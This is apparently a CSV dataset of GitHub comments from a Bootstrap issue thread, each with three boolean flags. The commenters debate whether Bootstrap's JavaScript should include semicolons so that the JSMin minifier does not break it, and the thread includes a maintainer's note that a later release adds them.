bootstrap/twbs/3057/5137003,Being on the technical committee in 2012 for a language initially created 16 years ago probably doesn't grant him authority to radically change things like that. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137061,"@friend Jacob wasn't trying to snippy, he was responding directly to one person's aggressive remarks. Taken out of context I can understand how it might look that way, but side-by-side, there's no issue there. All Jacob pointed out was that this is a bug in someone else's code and that guy comes in guns blazing instead of speaking calmly and objectively? I call bullshit on the whole situation. If semicolons aren't required, then we don't need to include them. It's as simple as that. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137063,"Forcing unwanted paradigms has no business in code reviews. Tools that reformat code can break code if the code is dependent on whitespace. Javascript is dependent on whitespace due to semicolon insertion. Javascript minification is not part of the language. So the code is correct for the author and they should not use a tool that breaks it. I agree that the code runs and my first statement speaks to the freedom of an author to do as they wish. The freedom to code as they see fit. Those are compelling reason to NOT change it. However, the reality is that very few individuals will use the code unminified and the question of ""correctness"" falls to common convention as a matter of pragmatism. The middleground is to add a semicolon for general use of the code. Branch it and have a nice bootstrap-dropdown-minification_safe.js - There's nothing wrong with changing the code as you see fit to meet your needs. Do not demand to change a tool because you want to use the tool in a way another author has explicitly said they will not support. That's hypocrisy. That's why people are getting upset. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137108,Learn to interop with existing toolset folks! This is a ridiculous debate. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137126,"Semicolons ARE the recommended practice... not just from Crockford, but also in Google's JS style guide ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137252,"@friend - line break or not, Javascript never ends a statement if the next token is an infix or bracket operator.    See  for some possibly surprising examples. So if ! becomes an infix op, then newline + ! will no longer be equivalent to ; + !. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137268,"nope - that's a bug in IE. Probably should let @friend know about it though. thanks!  Do you agree with this? While I agree that JSMin can be improved for this case, but you also ) ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137279,"If anyone is curious about the TC39 proposed syntax for the ! infix operator, here it is ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137306,Disagree with Mr. @friend approach you distribute the code to developers and don't want to listen to good practices that are advised. I would have refactored the code when I had faced complaints from the users. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137335,"Thanks to the stand-off on this issue, I have to maintain my own branch of Bootstrap with semicolons inserted so that it minifies gracefully. Keeping my repo in sync is not fun at all, so I'm deploying out-of-date versions with my apps. Given how much pain making production use of Bootstrap was, it felt like a version 0.2, not 2.0. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137365,"Clearly JSMIn isn't changing. That means Bootstrap can either add semicolons, or have people run into this issue again with JSMin. That's stupid, just use semi-colons. Also, being a hugely popular library, people who have never developed a thing in their life are probably going to learn from bootstrap code - and emulate it. Then this newbie is screwed. Some brave soul decides to get his idea into the real world, finds bootstrap as it's the best thing out there for making beautiful apps, seeks to modify things, and picks up bad habits. Embracing bad habits is a dis-service to the whole JS community. That's not cool. Newbies are going to use bootstrap. They are going to learn from bootstrap. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137403,Don't use JSMin with this project. Write documentation for newbies explaining why they shouldn't use JSMin.  Don't tell the maintainer he has to do x or y for his own project.  Fork it if you feel strongly enough to change the code. @friend shouldn't change his code to work with JSMin and @friend shouldn't change his code so bootstrap can work with it.  Just document why it doesn't work and move on? ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137411,"Agreed, if you're making a general purpose tool like Twitter Bootstrap, make it as compliant as possible and use good practices. Don't be a JavaScript hipster.  Add semi-colons. This is JavaScript.  Relying on implicit insertion of semi-colons is stupid. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137413,"This minifies just fine via Rails' asset precompiling - I've never ran into an issue with it. IMHO, this is my issue with JavaScript as a language being much too flexible and forgiving. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137415,"tl;dr use Coffeescript if you don't want semicolons. Semicolonless Javascript is an ego-stroking attempt at rejecting standards for the sake of rejecting standards, not for the greater benefit of the community. While the need for hacks exists just to get around using semicolons, the practice does greater harm than good. ""Use semicolons at the end of a statement"" is a far simpler rule than ""never use semicolons, except sometimes you have to use x hack, like prefixing with a !."" All this for the benefit of an opinionated aesthetic? I propose that one might as well use Coffeescript instead, if the intent is prettier code by standards set as a lack of syntactic symbols. Or, just write clean, standard (as defined by not just the specification, but as defined by the developer community) Javascript, if it is to be shared, used, and contributed to by the greater community. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137454,"@friend Regardless of whether you consider this usage of ASI a bug, it'd be ignorant not to acknowledge that there certainly is a bug in JSMin. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137459,"At the end of the day, the repo maintainers can do whatever they please. We're not paying to use Bootstrap. They can include ASCII fingers all over the place if it makes them happy. If we don't like it, we can use something else or fork it. That said, I still think this discussion is valuable (minus the aggression), as these sorts of conversations get people thinking more deeply about code standards and how they fit into our everyday work as developers. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137467,+@friend +@friend ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137552,"Even though a semicolon might be 'better'. The syntax is correct, and jsmin should NEVER change or break working code. Period. so either stop using jsmin, or start fixing jsmin. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137638,@friend I believe he's talking about putting the ! in front of that code. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137659,@friend I think the point is  vs ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137670,/ Title Immediate functions Description syntax that enables function execution as soon as it is defined/ (function () { console.log('watch out!'); }()); //alternative with less parentheses !function () { console.log('watch out!'); }(); // reference //  ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5137674,"The point of using C syntax is to have "";"" and ""{"" ""}"" to make sysntax and flow intend obvious to other programmers. This code is not obvious to other programmers (its not to me) so fix it by adding "";"" on the end of expressions. Thanks. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138004,"I don't think talking this much about a semicolon is worth it. Does refusing to use a semicolon make the code go faster? NO Does it make the code harder to read and understand? YES Will it break in the future? Probably Does it have the bigger potential for future bugs? YES Semicolon insertion was a mistake in JavaScript, along with eval, with and function scoping. People should be avoiding these instead of abusing them. Semicolons are better for readability if I see a diff, I know exactly where the line ends. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138012,"I take it you really read ecmascript262 (and I assume you did because you use it as an excuse for the bad practice of omitting semicolons) then you should realize that JS grammar is ambiguous. It's particularly ambiguous where it's about what constitutes a statement if you omit a semicolon. Browsers implement heuristics when trying to parse it (a fancy word for guessing) and as a result don't always agree between each other. Because humans aren't very good at parsing a context-sensitive grammar and executing an approximate state-machine and if/else decision tree to figure out if something is a statement or not, we punny humans tend to do it wrong every once in a while, even if we're extremely well versed and hold the entire JS grammar in our heads (which would be a considerable feat). Fortunately, there's a ""fix"" for this lamentable human condition. The fix is just to insert semicolons, even though technically it's not required in all cases. But I promise you, the time wasted writing out that semicolon is more than compensated by the time you will not spend hunting down heisenbugs due to browsers differing understanding of statements, the time not spent trying to make your JS code compatible to all JS-manglers (like JSmin, closure compiler etc.), the time not spent arguing in favor of an outdated and obviously bad practice with random people on the internet AND the time not spent fixing all your code when a browser implements a newer revision of JS. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138049,"Hello everyone, I've forked JSMin and implemented the desired behavior   scans for ""newline [whitespace] exclamation"" and replaces the newline with a semicolon. I hope this proves useful to someone (perhaps to the authors of Bootstrap).  It was a fun project. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138067,"@friend This means deploying your version of JSMin on all my systems, plus ensuring your version is in sync with upstream JSMin. Why can't we instead just replace all  with  in Bootstrap? It's easier and doesn't affect production environments. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138072,"Writing JavaScript without semicolons is like doing all of your HTML in quirks mode, with improper nesting, unclosed \&lt;li&gt; tags, and unquoted attribute values. Just as HTML was designed so that a webpage would still probably look ok even with a sloppy idiot writing markup in HotDog, JavaScript was designed so that people writing code in Notepad would still probably get something workable if they forgot a semicolon here and there. Doesn't make it the ""right"" way to do it. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138103,"@friend that's wonderful, can you please implement it as well for the YUI compressor, googles closure compiler, dean edwards packer and microsoft ajax minifier? ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138109,"Having experience using Bootstrap 1.4 on a large JS application, I can tell you that Bootstrap (1.4 at least) falls apart when uglified. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138111,Any fool can write code that a computer can understand.  Good programmers write code that humans can understand.  ~Martin Fowler ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138432,"Couldn't @friend's JSMin just output an explanatory fatal error in this case, for the reason outlined in the third reply here? All programs that pass JSMin would still be syntactically intact. And JavaScript non-wizards (like me) would not sit there with broken code produced from two parts which we thought we could rely on. (And a big thanks to unknown for deleting all the meme/boobs.gif crap replies!) ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138528,@friend I could try. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138589," The reason it was closed is because semicolons were added to the end of lines in 1.4. In 2.0 we removed them again when we introduced the downloader as it safely concats and minifies these files for you. I'm adding semicolons to the end of files in 2.0.1 - which will likely be released tomorrow, to support this mobile oddity."" ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138691,"“Be liberal in what you accept, and conservative in what you send.” ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138709,@friend Your fork does not minify this example correctly if (confirm('Are you sure?') &amp;&amp;     !false) {     alert('ok'); } ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138835,@friend fixed; thanks. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5138993,"tl;dr Someone finds bug in JSMin, people that use Bootstrap (for free) make demands and lecture the authors about the one true way to write JavaScript. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139062,"plus one to @friend @friend @friend  Egos does not do any good to community. When you are a library developer, sometimes you have to go with the not so nice implementation to support as many users as possible. If you just don't want this, then, don't share your code, remove it from GitHub, and continue close-sourced. The main goal of open sourcing, sharing, GitHubbing... is being open to real facts. Javascript uses semicolons, everywhere. Its like the issue on leaving a comma at the end of an array definition in javascript. Its valid, but... IE breaks. So, just delete them. (I can't imagine this people getting married &lt;g&gt;) ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139156,"@friend TL;DR two tools are incompatible to each other with each author claiming what they do is the one true way. However one tool (JSmin) is deployed across the entire JS ecosystem at countless locations site authors have no influence whatsoever, and the other is ignoring sage advice from one of our elders, you decide! P.S. we now also have a gazillion forks of JSmin and bootstrap, both of which are virtually useless for different reasons. If you fork JSmin you'd have to convince everybody in the foodchain to use the forked JSmin or you're still gettting screwed at places you have no choice about, and the bootstrap forks would have to keep up with the primary upstream (bootstrap) or they're quickly getting to a derelict unmaintained state. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139246,What is with this new group of JS developers that refuse to use a semi colon? You're idiots. Use the semi colon like you're supposed to do. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139250,"The solution to a problem like this is very simple. Project maintainers need to consider who the target audience for their project is, and maintain their project in such a way as to properly set and meet the expectations of that target audience. I would imagine that the target audience for Twitter Bootstrap generally  doesn't know the rules of JavaScript ASI doesn't know how to choose the right tools doesn't understand how to debug errors in the tools they use needs all the help they can get  Which means that it might be a good idea to consider  adopting a coding style that does as much as possible to help keep them out of harm's way documenting things the project does that might not conform to their expectations making explicit recommendations on tools and processes  Ever since I started actually teaching JavaScript, I've learned a lot about how to help reluctant JavaScripters (read the 99%) read and write code. Omitting all semicolons except where absolutely necessary for proper ASI definitely doesn't help them. Also, when responding to a user issue like this one, consider the first list. The user doesn't know what tool they should be using. The user doesn't know what's really going on. They've most likely inherited some arcane stack of tools that they can't discard, and need all the help they can get. (and passing the buck isn't really ""help"") ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139286,"Looking for a technical solution (""just use semicolons everywhere"") is not going to help with a social problem (reluctance to properly learn JavaScript). ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139319,"Also, regarding the setting of expectations, one of the most prominent headers on the Twitter Bootstrap homepage is Designed for everyone, everywhere. Just in case there was any confusion as to whom this project was designed for. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139323,"Like mentioning in the INSTALL or README that th script MAY NOT be compatible with this or that minifier. Would sound like a compromise solution to all three parties -- the Bootstarp,the JSmin and some developper. But it isn't. Have to keep my own readme.txt for every library with notes upon their potential bad behavior then implementing into production. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139330,"@friend that's pure arrogance. What about people in the process of ""properly learning"" Javascript? ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139338,"@friend funny you should say that because I always considered ""properly learning javascript"" to involve reading the spec, subsequently being horrified about the ambiguity in statement interpretation and henceforth using semicolons. Obviously there's a different level of comprehension, the one which doesn't read the entire ecmascript262 and stops at the paragraph about 1/4th down in the document that states semicolons are optional, but doesn't actually make it down to the grammar. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139362,"@friend Are you seriously implying that users of either JSMin or bootstrap shouldn't be making recommendations to the authors of said libraries? Come on now... that's how open source works. Crockford, while abrasive and aggressive, has pointed out that bootstrap has a high likelihood of breaking in the future with in standard JavaScript if they continue to use a specific ""style"". The point being that relying on ASI (a set of rules that change, at least according to TC39) is not as reliable and future-proof as just using semicolons. Presenting it as an argument about the ""one true way"" is spurious. Here we have someone who, for better or worse, is helping shape the future of JavaScript telling someone their code will break, and that advice being ignored. For what reason? So the code looks pretty? This isn't about the ""one true way""... this is about saying that using semicolons is a best practice, because it'll mean your code has a better chance of staying semantically correct in the future. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139408,"Apart from the semicolon issue, what's wrong with signifying your intent in your code rather than abusing the logical operators if(!isActive) {     $parent.toggleClass('open'); }  ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139429,"It's a tough issue either way. If Crockford changes JSMin to accept this input, JSMin is helping devs write code that'll possibly break in standard JS in the future. If he doesn't, he'll be not accepting input that works in all flavors of JS right now. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139452,Reason to use semicolons - code will work properly and people will be able to get work done. Reason not to use semicolons - aesthetics and ego. Are you adults or children? ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139511,"Entertaining thread ) You clearly have first world problems. Come on, it is just some extra characters which is also best practice. Not fixing a problem that you otherwise could in 2 seconds is not very smart move for whatever reason. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139595,"For the folks out there using Django compressor, see this issue ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139656,"You guys are all really angry lol... It's simple, you want a semicolon there. Fork the repo and add it yourself and shut your mouth. Problem solved. It's fat's choice, and let it be. Don't try and shove your ahole lectures on why semicolons are used in herpy derps javascript library therefore must be used in everyones. There are plenty of forks that solve this problem, or you could just open notepad and add one at this spot. Nobody has any right of demanding someone who does something for his free time to change anything (assuming Twitter doesn't sponsor this, which I don't think they do?). If you have a problem with it, that's why they invented open source... so you can download it and add myfacesmells_ to the beginning of every variable. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139687,Semicolon insertion is a backup... a bonus.... relying on it is insanely stupid. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139709,"@friend, Twitter does not sponsor it, as per Mark and Jacob's words in some other thread. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139722,"If you have pigeon shit on your shoulder and I dare to mention it to you then you can say that ""Hmm, I see it but it looks good there, I also know that pigeon, his name is Dave, now move on."" or you can just say ""Thanks dude, I didn't notice it"". Btw you are right there should be a different branch called ""Twitter bootstrap (with semicolons)"" ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139735,"Here, I'll fix this thread s/insanely stupid/potentially incompatible and therefore not advised/g s/dumb down JSMin/allow JSMin to accept input that goes against TC39 because it might break future compat/g s/learn to use semicolons properly/please start using semicolons, as that will help ensure future compatability./g ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139737,"Add the stupid semicolon already. The longer the delay, the more painful it will become. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139749,Or just use UglifyJS? I don't recall it having problems with that issue. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139754,"It's not painful to fat. He doesn't give a crap... it's painful to the morons in this thread trying to force him to add it, rather then just adding it themselves when they download. Also saying that some possible change in the future might break this is stupid. That's like saying you shouldn't use X function in php because it may be deprecated in 2020. Or you shouldn't use any HTML5 attribute because the spec is not done and it might change. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139755,"Regardless of whether semicolons are best practice or not, the fact jsmin is breaking existing, functional non-minified code is a flaw. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139814,"It also works with  I believe and  is actually smaller then jsmin. Both are positives! Or you could just not minify your javascript, in this day and age with the amount of bandwidth we all have. It really would not be a big deal. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139889,"@friend , why so angry? I personally don't care if bootstrap adds the semicolon. I can easily add the semicolon myself. What I care about is other people having their stuff break because neither crockford nor fat are willing to budge here. The advice I gave about future compat might be a case of YAGNI, or it might not be. Only time will tell. But look at the possible outcomes Crockford adds support 1. Accept input that may break in the future. 2. Accept more input that works right now. 3. Crockford acknowledges that while it's harder and potentially riskier to not use semicolons, it's still perfectly valid right now, and his tool should just be minifying, not enforcing a standard (that's what JSLint is for). Fat adds semicolon 1. Have your code be potentially more future-proof. 2. Make your code work with JSMin. 3. Bow to the practice that adding semicolons increases compatability with existing tools and is easier than not using semicolons. Neither budges 1. Other forks must be constantly maintained to add semicolons to make it work with JSMin, or otherwise abandon JSMin as a reliable minifier. I personally think @friend should just add the semicolon given the options above. If you disagree, fine, but it doesn't make either of our arguments stupid. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139906,"@friend I think you might want to try  I think it would successfully minify this, although I haven't tested myself. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139914,"""Or you could just not minify your javascript, in this day and age with the amount of bandwidth we all have. It really would not be a big deal."" @friend Someone's clearly never heard of a mobile data plan, or lived in a country that doesn't happen to have one of the fastest pipes in the world. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139976,"@friend Even on fast connections, minifying is important. Of course, other things should also be done for maximum increase in speed - minify, concatenate, gzip. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5139988,"@friend Of course, I was just pointing out the obvious. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140078,"Whether or not one agrees with ASI, it is in the current spec. Therefore, that JSMin does not support this line of code would make it non-compliant. Imagine if you used the same argument to try and get out of paying taxes? ""That rule is stupid and I don't follow it""? Douglas Crockford, bless his soul, is known for not being overtly diplomatic. I don't think he should change JSMin because in my view that would be compromising ""Crockford"". However, that does make his product less universal -- and that's good. People should be using JSMin because Crockford wrote it, not because it's expected to work everywhere. The idea is that if JSMin doesn't work on a given codebase, it's probably because Crockford wouldn't approve of that codebase -- and if that's important to you, then you know what to do avoid Bootstrap! Then again, I have to wonder if this battle of integrity is worth losing potential Bootstrap users. Besides, it wouldn't be too hard to prefix punctuation on the beginning of newlines with  -- a technique often employed by proponents of ASI. Changing the code to  would satisfy concerns while having neither person sacrifice on their ideals. EDIT  or just do what @friend below me says, which is smarter. I think the world would run a little smoother if we all felt, ASI and semicolon users alike, that punctuation on the beginning of a new line that doesn't have a semicolon in front of it is a code smell in javascript. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140085,"i'm 100% with @friend on the semicolons, but don't understand the benefit of writing the very fragile when is shorter and is clearer, and neither break as easily. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140102,"@friend shouldn't be adding a semicolon because it makes the codebase too big. People keep complaining ""Boo hoo hoo, twitter is so bulky and laggy!"", and then they contradict themselves by requesting the codebase get larger with needless semicolons. smh, people these days.... ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140169,"@friend You opened this as open source. When you do that you should be respectful of the people who will be using your code. That means adding semi-colons so we can all pick whatever minifier we want. But hey, i guess being a dick about the code you released as open source works too. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140311,@friend Object f has no method 'forEach' undefined is not a function number is not a function will compress wrong ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140317,"Yes, @friend, if you give me a free sandwich, I DEMAND THAT YOU GIVE ME THE PROPER SERVING OF MAYONNAISE, as dictated in Proper Sandwich Specification JB-332. To withhold the proper serving of mayonnaise, as dictated by the sandwich community, clearly means that you are a dick, whereas I am a simple and humble masticator who's just trying to consume the sandwich that you handed me for free without any loss of mayonnaise taste that I desire. I shall toss your free sandwich aside until you give me the sandwich that I clearly deserve. After all, Douglas Crockford gave me a free sandwich, and it had exactly the right amount of mayonnaise and it creamed my mouth just right. The problem is obviously you, so hurry up and FIX MY FREE SANDWICH, and don't you dare ever try to hand me free food again without meeting these minimum sandwich specifications. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140332,"@friend plus one. Also, @friend, you're right. I think you've just reversed my opinion. Also, David Herman, another TC39 member, has indicated that TC39 will not be breaking existing code. In this case, @friend should support this correct code, even if it's against his preference, or he shouldn't call it a JS Minifier, he should call it a ""Douglas Crockford Flavored JavaScript minifier"". But also, @friend should change the code in the way @friend suggested. A bit of compromise on both sides so we can move on already. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140336,@friend none of which appear in the offending snippet. let's stay on topic. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140350,Really? What's immature are the needless personal attacks against @friend over a coding style. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140376,@friend Yep. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140379,"@friend No, he released it as open source. Being disrespectful to the developers using it and then other developer's tools because it doesn't work with your code is wrong. It's not even about if he likes semi-colons or not or his coding style. It's open source. Be nice to the people who are using your code for god's sake. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140520,"@friend As far as I can see, JSMin doesn't claim to follow the spec - it claims to work on what jslint says is ok. I think  works on the spec, although I haven't tried it. I believe the reason JSMin doesn't is to make it smaller(and faster!). @friend Can't tell if serious. If you are... a minifier gets rid of a newline character instead... and much more. Otherwise, carry on! ) ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140572,@friend Telling developers who are legitimately trying to use your code that they just dont know how to use semi-colons and that everyone else needs to work around their coding style is wrong in the open source world. It's about working together not trying to boost your ego. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140599,"@friend If you want to talk about ""sandwiches"" and how it relates, it'd be like giving away a free one (great!) and when they ask for a napkin you respond with ""well, I know how not to spill it on myself, maybe you should learn to not make a mess on yourself too."" ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140659,@friend Just a minor correction on my previous comment - apparently  is good. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140679,"In his talk at at JSConf, @friend basically stated that he sometimes uses semicolons, and sometimes doesn't, and that he omits semicolons from Bootstrap in a deliberately enigmatic attempt to troll the community... Mission accomplished! ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140833,"I have to admit to being one lazy bastard, and also like languages that have gone past C syntax just a little bit.  Really, ;'s should just be for separating two statements on one line.  Design for the rule, not the exception. It took me way to long to find out that coffee-script was popular partly because it tries to protect you from JS by removing ambiguities and avoiding The Bad/Ugly Parts. Don't get me wrong, I am a huge fan of JSEverywhere client, server, datacom (JSON).  I think async is the safest, easiest understood multiprocessing technique.  Fork/Join is just too hard for humans .. I watched Sun struggle through 3 years getting Solaris multi-threaded.  Nightmare. Damn.  Now I gotta learn all the Ugly parts of coffee-script I suppose. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140859,"People coming from different programming background are trying to adapt or style JavaScript to the environment they are familiar with.  There's nothing wrong in that.  JavaScript already has some bad things, but it also has many good things as well. Let the language be as it is and adapt it to what is best suited without breaking things that are already present.  Love the language for the good and respect the quirkiness as this language has evolved from a toy language to one of the most used and talked about language in the world. Respect the members who have been trying to put sanity to the language and come up with guidelines and tools to make it work and understandable across various segments. Style and beauty comes later.  What matters is the language's consistency. So, if that means putting a semicolon, why can't that be? Again not for flaming this discussion. It has taken ages to make people realize the good and bad parts of the JS language, so why not respect that and move ahead. If opensource is about sharing, then its also about caring (caring for all the apps already running which has been developed years before some developers were born).. Definitely one can fork and move ahead, but that's not the point of this discussion, I guess. By the way.. I love bootstrap as being a non-designer it helps me quickly build beautiful websites ) ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140916,"fwiw, this was patched in bootstrap way before i even encountered this issue - otherwise i wouldn't have closed it outright. Sorry for the confusion everyone. You can see the code here in 2.0.3  still maintain this is a bug in jsmin, but as others have pointed out - mark and I do our best to make bootstrap flexible with other great tools out there (like jsmin). This includes adding semicolons where necessary or changing minor stylistic things. @friend 2.0.3 should work fine for you - and will be released while mark and i are in london (april 21-25). cheers! ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140934,"@friend If TC-39 makes ! an infix operator, which causes \n to not terminate the statement, then that will be a syntax change that is incompatible with current code in the wild, which would be an insanely stupid move on their part. The fact of the matter is that JSMin isn't parsing JavaScript correctly.  I thought the separation of concerns was that JSLint tells you about stupid code, and JSMin correctly parses JavaScript according to the ES standard and minifies it safely. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5140961,"Wow, @friend is such a brogrammer ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141015,"Whatever gave you the idea that either of those tools actually parse JavaScript? UglisfyJS does for minifying. Esprima does in general, as do others. @friend created wonderful tools back before many others even thought to, but JSMin has been superseded by many alternatives, that I'm frankly surprised that it is used anymore. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141035,"@friend - Kudos for making the change. Agree or disagree with semi colons ( FWIW I agree) , it's nothing but positive when JavaScript code libraries work together. There are too many out there that don't integrate. I love bootstrap and an thrilled to see this change. Thanks. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141060,"I suspectedthat from the start -- that's what it was. HAHAHA Thanks, gents ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141071,Fixed in jsmin?  ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141098,"@friend parse !== ""build a complete and accurate syntax tree"" JSMin walks through the JavaScript code maintaining state and taking actions based on that state.  It is removing a \n character where doing so causes a change in program behavior. Stupid code or not, this is a broken minifier, because it's not adhering to the contract it claims to. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141206,Thank for not using semicolons =) Semicolons -1 ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141214,"@friend I love your choice of !== rather than != ) I'd say (which is not at odds with your assertion) parse == ""build a complete and accurate syntax tree"" After all, ! has side effects and a more complex AST on the client. Play with  and see. Anyhow, back to taxes... ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141218,See also this related issue ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141279,"When I joined Yahoo! I had the habit of not including semi-colons after the last declarations in declaration blocks. I know that's CSS, but it does relates to this thread... Not adding "";"" was against company best practices, but I thought there was no reason to add them since they are not required. It turned out that Safari 2 had a bug that made it drop a whole styles sheet after a missing semi-colon. At the time, I didn't spend energy trying to defend myself; I added the semi-colon and moved on. Imo, the point is not about finding out who's right or wrong, it's about doing the right thing. It's about the outcome. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141284,"""Don't be a JavaScript hipster. Add semi-colons."" I love this one! Seriously, use the f@#king semicolons. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141293,For fucks sake people - if using ugly semicolons and a few extra parenthesis will guarantee current AND future compatibility then what is the problem?  I don't find code written in this fashion difficult to read. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141319,I heard semicolons killed @friend 's family and now he's using the left-over wealth from his father's fortune to fight against them. Seems legit. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141327,"Wow, so both @friend and @friend made changes to support interop. Bravo. ",False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141375,Take a look  by @friend  I'm personally prefer semicolons ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141477,Everyone wins! Both libraries get a little better. Thanks @friend and @friend for working to make the internet more awesome. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141600,@friend hm that's weird. I'm using uglifyjs in Rails asset pipeline and never had issues. ,False,True,False,bootstrap/twbs/3057
bootstrap/twbs/3057/5141725,Semicolons cause an equal amount of debate in English grammar circles and although it's yet to be proven I believe they partially caused the first World War. Clearly the solution to all the world's problems is to remove semicolons from the global character set. ,False,True,False,bootstrap/twbs/3057
